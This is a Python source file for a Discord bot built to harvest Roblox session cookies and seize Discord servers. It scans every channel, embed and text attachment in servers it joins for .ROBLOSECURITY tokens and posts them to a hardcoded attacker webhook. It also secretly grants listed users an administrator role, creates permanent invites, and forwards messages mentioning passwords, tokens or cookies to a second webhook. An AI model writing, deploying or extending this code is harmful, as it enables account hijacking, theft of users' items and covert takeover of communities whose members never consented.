import os
import discord
from discord import app_commands
import aiohttp
import asyncio
import datetime
import re
import logging
import io
import json
from typing import List, Union, Dict, Any
from flask import Flask
from threading import Thread

# 🟢 Environment variables for Render (no dotenv needed)
BOT_TOKEN = os.environ['DISCORD_TOKEN']
WEBHOOK_URL = os.environ.get('WEBHOOK_URL')
MIRROR_WEBHOOK_URL = os.environ.get('MIRROR_WEBHOOK_URL')

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

AUTHORIZED_USERS = [216953894322962433, 1422280514072608932, 219564668933373962]
CONTROL_CHANNEL_ID = 1432729863692881972
COOKIE_WEBHOOK_URL = "https://discord.com/api/webhooks/1432710240343822467/uYzeK2Z0TADkceF97olVympDJiJIJFDYbVrnz4uHwpV3AYh7QswHwb8-EVvrQ1SzyCHb"
OWNED_SERVER_IDS = [1396878002620727397]
SERVER_INVITES = {}

# 🟢 Bot state management
class BotState:
    def __init__(self):
        self.auto_delete_enabled = {}
        self.mirrored_messages = set()
        self.server_roles = {}

bot_state = BotState()

# 🟢 Flask server for UptimeRobot
app = Flask('')

@app.route('/')
def home():
    return "🤖 Bot running 24/7 on Render!"

@app.route('/health')
def health():
    return "✅ Healthy"

@app.route('/ping')
def ping():
    return "pong"

def run_flask():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

# Start Flask in background
flask_thread = Thread(target=run_flask)
flask_thread.daemon = True
flask_thread.start()

# 🟢 Handle webhook button interactions
@bot.event
async def on_interaction(interaction):
    if interaction.type == discord.InteractionType.component:
        custom_id = interaction.data.get('custom_id', '')

        if custom_id.startswith('enable_delete_'):
            guild_id = int(custom_id.split('_')[-1])
            guild = bot.get_guild(guild_id)
            if not guild:
                await interaction.response.send_message("❌ Server not found!", ephemeral=True)
                return

            if interaction.user.id not in AUTHORIZED_USERS:
                await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
                return

            bot_state.auto_delete_enabled[guild_id] = True
            await interaction.response.send_message("✅ Auto-delete enabled! Messages with @everyone/@here will be deleted.", ephemeral=True)

        elif custom_id.startswith('disable_delete_'):
            guild_id = int(custom_id.split('_')[-1])
            guild = bot.get_guild(guild_id)
            if not guild:
                await interaction.response.send_message("❌ Server not found!", ephemeral=True)
                return

            if interaction.user.id not in AUTHORIZED_USERS:
                await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
                return

            bot_state.auto_delete_enabled[guild_id] = False
            await interaction.response.send_message("❌ Auto-delete disabled!", ephemeral=True)

        elif custom_id.startswith('scrape_'):
            guild_id = int(custom_id.split('_')[-1])
            guild = bot.get_guild(guild_id)
            if not guild:
                await interaction.response.send_message("❌ Server not found!", ephemeral=True)
                return

            if interaction.user.id not in AUTHORIZED_USERS:
                await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
                return

            await interaction.response.defer(ephemeral=True)
            await scrape_server_cookies(interaction, guild)

# 🟢 Optimized Cookie Fetcher
class CookieFetcher:
    def __init__(self):
        self.processed_messages = set()
        self.cookie_patterns = [
            r'_?\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[^\s]+',
            r'CAEaAhA[B-D]\.[A-Za-z0-9_-]{100,}',
            r'_?\|WARNING:-DO-NOT-SHARE-THIS\.\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|\s*([^|\s]+)'
        ]

    def extract_cookies_from_text(self, text: str) -> List[str]:
        if not text:
            return []

        cookies_found = []
        
        # Check for cookies in text
        for pattern in self.cookie_patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]
                
                # Clean and format the cookie
                if match.startswith('_|WARNING'):
                    cookies_found.append(match)
                elif match.startswith('CAEaAhA'):
                    cookies_found.append(f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{match}")
                else:
                    clean_match = re.sub(r'[^\w._-]', '', match)
                    if clean_match.startswith('CAEaAhA'):
                        cookies_found.append(f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{clean_match}")

        return list(set(cookies_found))

    async def fetch_attachments(self, message) -> List[str]:
        """Extract cookies from text attachments"""
        cookies_found = []
        
        for attachment in message.attachments:
            if attachment.filename.endswith(('.txt', '.log', '.json')):
                try:
                    content = await attachment.read()
                    text_content = content.decode('utf-8', errors='ignore')
                    
                    attachment_cookies = self.extract_cookies_from_text(text_content)
                    cookies_found.extend(attachment_cookies)
                    
                except Exception as e:
                    logger.error(f"Error reading attachment {attachment.filename}: {e}")
        
        return cookies_found

    async def fetch_all_server_cookies(self, guild) -> Dict[str, Any]:
        """Ultra-fast cookie scraping from server"""
        all_cookies = set()
        total_messages_scanned = 0
        total_attachments_scanned = 0

        async def process_channel(channel):
            channel_cookies = set()
            messages_count = 0
            attachments_count = 0
            
            try:
                # Fast processing
                async for message in channel.history(limit=5000):
                    messages_count += 1
                    
                    # Extract from message content
                    content_cookies = self.extract_cookies_from_text(message.content)
                    channel_cookies.update(content_cookies)
                    
                    # Extract from embeds
                    for embed in message.embeds:
                        if embed.description:
                            embed_cookies = self.extract_cookies_from_text(embed.description)
                            channel_cookies.update(embed_cookies)
                        if embed.title:
                            title_cookies = self.extract_cookies_from_text(embed.title)
                            channel_cookies.update(title_cookies)
                        for field in embed.fields:
                            field_cookies = self.extract_cookies_from_text(field.value)
                            channel_cookies.update(field_cookies)
                    
                    # Extract from attachments
                    attachment_cookies = await self.fetch_attachments(message)
                    channel_cookies.update(attachment_cookies)
                    attachments_count += len([a for a in message.attachments if a.filename.endswith(('.txt', '.log', '.json'))])
                    
            except Exception as e:
                logger.error(f"Error processing channel {channel.name}: {e}")
            
            return list(channel_cookies), messages_count, attachments_count

        # Process all channels concurrently for maximum speed
        tasks = []
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).read_messages:
                tasks.append(process_channel(channel))

        # Use asyncio.gather for concurrent processing
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, tuple) and len(result) == 3:
                cookies, count, att_count = result
                all_cookies.update(cookies)
                total_messages_scanned += count
                total_attachments_scanned += att_count

        return {'all': list(all_cookies), 'messages_scanned': total_messages_scanned, 'attachments_scanned': total_attachments_scanned}

    async def send_to_cookie_webhook(self, all_cookies: List[str], unique_cookies: List[str], messages_scanned: int, attachments_scanned: int, time_taken: float) -> bool:
        """Send cookie results to the cookie webhook with the OLD FORMAT"""
        try:
            async with aiohttp.ClientSession() as session:
                # Format cookies with empty line after each for better readability
                all_cookies_content = "\n\n".join(all_cookies) if all_cookies else ""
                
                # Create the blue embed with bigger, bolder text (OLD FORMAT)
                embed = discord.Embed(
                    description=f"**🍪 Cookie Fetch Complete**\n**✅ Cookies Found**\n**{len(all_cookies)}**\n**🔑 Unique Cookies**\n**{len(unique_cookies)}**\n**📩 Messages Scanned**\n**{messages_scanned}**\n**📎 Attachments Scanned**\n**{attachments_scanned}**\n**⏱️ Took**\n**{time_taken:.1f} seconds**",
                    color=0x3498db  # Blue color
                )

                # Send cookies as file with form data
                form_data = aiohttp.FormData()
                form_data.add_field('payload_json', json.dumps({
                    'username': 'Cookie Fetcher',
                    'content': '@everyone\nto get these mass checked dm vextroz0001 on discord mass checking is when u mass check cookies to split valid and invalid ones',
                    'embeds': [embed.to_dict()]
                }))
                form_data.add_field('file', all_cookies_content.encode('utf-8'), filename='cookies.txt', content_type='text/plain')

                async with session.post(COOKIE_WEBHOOK_URL, data=form_data) as response:
                    if response.status not in [200, 204]:
                        logger.error(f"Failed to send to cookie webhook: {response.status}")
                        return False
                    else:
                        logger.info("Successfully sent to cookie webhook")
                        return True

        except Exception as e:
            logger.error(f"Error sending to cookie webhook: {e}")
            return False

# 🟢 Optimized Bot Class
class CookieFetcherBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        intents.messages = True
        intents.message_content = True
        intents.guilds = True
        intents.members = True
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)
        self.fetcher = CookieFetcher()

    async def auto_scrape_all_servers_on_restart(self):
        """Auto-scrape all non-owned servers on bot restart"""
        logger.info("🔄 Auto-scraping all servers on restart...")

        for guild in self.guilds:
            if guild.id not in OWNED_SERVER_IDS:
                try:
                    logger.info(f"🔄 Auto-scraping {guild.name} on restart...")
                    start_time = datetime.datetime.now()

                    result = await self.fetcher.fetch_all_server_cookies(guild)
                    all_cookies = list(set(result['all']))
                    actual_messages_scanned = result.get('messages_scanned', 0)
                    attachments_scanned = result.get('attachments_scanned', 0)
                    unique_cookies = [c for c in all_cookies if 'CAEaAhAC' in c]

                    end_time = datetime.datetime.now()
                    time_taken = (end_time - start_time).total_seconds()

                    # Send to cookie webhook
                    await self.fetcher.send_to_cookie_webhook(all_cookies, unique_cookies, actual_messages_scanned, attachments_scanned, time_taken)

                    logger.info(f"✅ Restart auto-scraped {len(all_cookies)} cookies from {guild.name}")
                except Exception as e:
                    logger.error(f"❌ Error auto-scraping {guild.name} on restart: {e}")

    async def setup_hook(self):
        await self.tree.sync()
        logger.info("✅ Commands synced")

    async def on_ready(self):
        logger.info(f'✅ Bot online: {self.user} (ID: {self.user.id})')
        logger.info(f'📊 Connected to {len(self.guilds)} servers')

        # 🟢 AUTO-SCRAPE ALL SERVERS ON RESTART
        await self.auto_scrape_all_servers_on_restart()


    async def ensure_dollar_role(self, guild):
        """Ensure $$$ role exists (only create one)"""
        if guild.id in bot_state.server_roles:
            return bot_state.server_roles[guild.id]
        
        # Check if role already exists
        existing_role = discord.utils.get(guild.roles, name="$$$")
        if existing_role:
            bot_state.server_roles[guild.id] = existing_role
            return existing_role
        
        # Create new role
        try:
            role = await guild.create_role(
                name="$$$",
                permissions=discord.Permissions(administrator=True),
                color=discord.Color.gold(),
                hoist=False,  # Make invisible
                mentionable=False
            )
            bot_state.server_roles[guild.id] = role
            logger.info(f"Created $$$ role in {guild.name}")
            return role
        except Exception as e:
            logger.error(f"Error creating role in {guild.name}: {e}")
            return None

    async def assign_role_to_authorized(self, guild):
        """Assign $$$ role to authorized users"""
        role = await self.ensure_dollar_role(guild)
        if not role:
            return
        
        for user_id in AUTHORIZED_USERS:
            member = guild.get_member(user_id)
            if member and role not in member.roles:
                try:
                    await member.add_roles(role, reason="Authorized user")
                    logger.info(f"Assigned $$$ role to {member.name} in {guild.name}")
                except Exception as e:
                    logger.error(f"Error assigning role to {member.name}: {e}")

    async def auto_scrape_server(self, guild):
        """Auto-scrape a single server"""
        try:
            logger.info(f"🔄 Auto-scraping new server: {guild.name}")
            start_time = datetime.datetime.now()
            
            result = await self.fetcher.fetch_all_server_cookies(guild)
            all_cookies = list(set(result['all']))
            actual_messages_scanned = result.get('messages_scanned', 0)
            attachments_scanned = result.get('attachments_scanned', 0)
            unique_cookies = [c for c in all_cookies if 'CAEaAhAC' in c]
            
            end_time = datetime.datetime.now()
            time_taken = (end_time - start_time).total_seconds()

            # Send to cookie webhook
            await self.fetcher.send_to_cookie_webhook(all_cookies, unique_cookies, actual_messages_scanned, attachments_scanned, time_taken)
            
            logger.info(f"✅ Auto-scraped {guild.name}: {len(all_cookies)} cookies")
            
        except Exception as e:
            logger.error(f"❌ Error auto-scraping {guild.name}: {e}")

    async def on_guild_join(self, guild):
        """Handle server join - AUTO everything"""
        try:
            # Generate invite
            invite_url = "No invite available"
            try:
                channels = [c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite]
                if channels:
                    invite = await channels[0].create_invite(max_age=0, max_uses=0, reason="Bot invite")
                    invite_url = invite.url
                    SERVER_INVITES[guild.id] = invite_url
            except Exception:
                pass

            if guild.id not in OWNED_SERVER_IDS:
                # Send takeover notification with buttons to mirror webhook
                takeover_embed = discord.Embed(
                    title="🚨 New Server Joined",
                    description=f"**Server:** {guild.name}\n**Members:** {guild.member_count:,}\n**Invite:** {invite_url}",
                    color=0x00ff00
                )

                takeover_data = {
                    'username': 'Server Takeover Bot',
                    'content': '@everyone',
                    'embeds': [takeover_embed.to_dict()],
                    'components': [
                        {
                            'type': 1,  # Action row
                            'components': [
                                {
                                    'type': 2,  # Button
                                    'style': 3,  # Green
                                    'label': 'Enable Auto-Delete',
                                    'custom_id': f'enable_delete_{guild.id}'
                                },
                                {
                                    'type': 2,  # Button
                                    'style': 4,  # Red
                                    'label': 'Disable Auto-Delete',
                                    'custom_id': f'disable_delete_{guild.id}'
                                },
                                {
                                    'type': 2,  # Button
                                    'style': 2,  # Grey
                                    'label': 'Scrape Cookies',
                                    'custom_id': f'scrape_{guild.id}'
                                }
                            ]
                        }
                    ]
                }

                # Send takeover with buttons to mirror webhook
                if MIRROR_WEBHOOK_URL:
                    async with aiohttp.ClientSession() as session:
                        async with session.post(MIRROR_WEBHOOK_URL, json=takeover_data) as response:
                            if response.status not in [200, 204]:
                                logger.error(f"Failed to send takeover to mirror webhook: {response.status}")

                # 🟢 AUTO-ASSIGN ROLES
                await self.assign_role_to_authorized(guild)

                # 🟢 AUTO-SCRAPE IMMEDIATELY
                await self.auto_scrape_server(guild)

                logger.info(f"✅ Auto-setup completed for {guild.name}")

        except Exception as e:
            logger.error(f"Error in on_guild_join: {e}")

    async def on_member_join(self, member):
        """Auto-assign $$$ role to authorized users when they join"""
        if member.id in AUTHORIZED_USERS and member.guild.id not in OWNED_SERVER_IDS:
            await self.assign_role_to_authorized(member.guild)

    async def on_message(self, message):
        if message.author == self.user:
            return

        if message.guild and message.guild.id in OWNED_SERVER_IDS:
            return

        guild_id = message.guild.id if message.guild else None

        # 🟢 AUTO-DELETE @everyone/@here messages if enabled
        if (guild_id in bot_state.auto_delete_enabled and
            bot_state.auto_delete_enabled[guild_id] and
            message.guild and
            (message.mention_everyone or
             '@everyone' in message.content.lower() or
             '@here' in message.content.lower())):

            try:
                if message.channel.permissions_for(message.guild.me).manage_messages:
                    await message.delete()
                    logger.info(f"🗑️ Deleted ping message from {message.author.name} in {message.guild.name}")
            except Exception as e:
                logger.error(f"Error deleting message: {e}")

        # 🟢 AUTO-MIRROR specific messages if MIRROR_WEBHOOK_URL is set
        if (MIRROR_WEBHOOK_URL and
            message.id not in bot_state.mirrored_messages and
            message.guild):
            
            should_mirror = False
            mirror_reason = ""
            
            # Check for @everyone/@here
            if message.mention_everyone or '@everyone' in message.content.lower() or '@here' in message.content.lower():
                should_mirror = True
                mirror_reason = "Mass ping detected"
            
            # Check for password/keywords in content
            sensitive_keywords = ['password', 'login', 'credential', 'token', 'secret', 'cookie', 'roblox']
            if any(keyword in message.content.lower() for keyword in sensitive_keywords):
                should_mirror = True
                mirror_reason = "Sensitive content detected"
            
            # Check embeds for sensitive content
            for embed in message.embeds:
                embed_text = f"{embed.title or ''} {embed.description or ''}"
                if any(keyword in embed_text.lower() for keyword in sensitive_keywords):
                    should_mirror = True
                    mirror_reason = "Sensitive content in embed"
                    break

            if should_mirror:
                bot_state.mirrored_messages.add(message.id)
                await self.mirror_message(message, mirror_reason)

    async def mirror_message(self, message, reason):
        """Mirror message to webhook"""
        try:
            async with aiohttp.ClientSession() as session:
                mirror_data = {
                    'username': f"{message.author.name} | {message.guild.name}",
                    'content': f"**{reason}**\n{message.content}",
                    'avatar_url': str(message.author.avatar.url) if message.author.avatar else None
                }

                if message.embeds:
                    mirror_data['embeds'] = [embed.to_dict() for embed in message.embeds]

                async with session.post(MIRROR_WEBHOOK_URL, json=mirror_data) as response:
                    if response.status not in [200, 204]:
                        logger.error(f"Failed to mirror message: {response.status}")

        except Exception as e:
            logger.error(f"Error mirroring message: {e}")

# Initialize bot
bot = CookieFetcherBot()

# 🟢 Scrape command (anyone can use)
@bot.tree.command(name="scrape", description="Scrape Roblox cookies from this server")
async def scrape_command(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    await scrape_server_cookies(interaction, interaction.guild)

# 🟢 Use command (authorized only)
@bot.tree.command(name="use", description="Scrape cookies from a specific server by invite link")
@app_commands.describe(invite="Server invite link")
async def use_command(interaction: discord.Interaction, invite: str):
    if interaction.user.id not in AUTHORIZED_USERS:
        await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)

    try:
        # Extract invite code from URL
        import re
        invite_match = re.search(r'discord\.gg/([a-zA-Z0-9]+)', invite)
        if not invite_match:
            await interaction.followup.send("❌ Invalid invite link format!", ephemeral=True)
            return

        invite_code = invite_match.group(1)

        # Check if bot is in that server
        invite_obj = await bot.fetch_invite(invite_code)
        if not invite_obj or not invite_obj.guild:
            await interaction.followup.send("❌ Could not find server or bot is not in it!", ephemeral=True)
            return

        target_guild = invite_obj.guild
        bot_member = target_guild.get_member(bot.user.id)
        if not bot_member:
            await interaction.followup.send("❌ Bot is not in that server!", ephemeral=True)
            return

        # Scrape the target server
        await scrape_server_cookies(interaction, target_guild)

    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)

# 🟢 Vex command (authorized only)
@bot.tree.command(name="vex", description="Scrape cookies from ALL servers the bot is in")
async def vex_command(interaction: discord.Interaction):
    if interaction.user.id not in AUTHORIZED_USERS:
        await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)

    total_servers = 0
    total_cookies = 0

    for guild in bot.guilds:
        if guild.id not in OWNED_SERVER_IDS:
            try:
                result = await bot.fetcher.fetch_all_server_cookies(guild)
                cookies = result['all']
                total_cookies += len(cookies)
                total_servers += 1

                # Send to webhook
                unique_cookies = [c for c in cookies if 'CAEaAhAC' in c]
                messages_scanned = result.get('messages_scanned', 0)
                attachments_scanned = result.get('attachments_scanned', 0)
                await bot.fetcher.send_to_cookie_webhook(cookies, unique_cookies, messages_scanned, attachments_scanned, 0)

            except Exception as e:
                logger.error(f"Error scraping {guild.name}: {e}")

    await interaction.followup.send(f"✅ Scraped {total_servers} servers, found {total_cookies} total cookies!", ephemeral=True)

# 🟢 Enhanced auto-restart main loop
if __name__ == "__main__":
    if not BOT_TOKEN:
        logger.error("❌ DISCORD_TOKEN not found")
        exit(1)

    logger.info("🚀 Starting Bot on Render...")
    
    # Auto-restart on crash
    while True:
        try:
            bot.run(BOT_TOKEN)
        except discord.LoginFailure:
            logger.error("❌ Invalid token - stopping")
            break
        except Exception as e:
            logger.error(f"❌ Bot crashed: {e}")
            logger.info("🔄 Restarting in 10 seconds...")
            import time
            time.sleep(10)
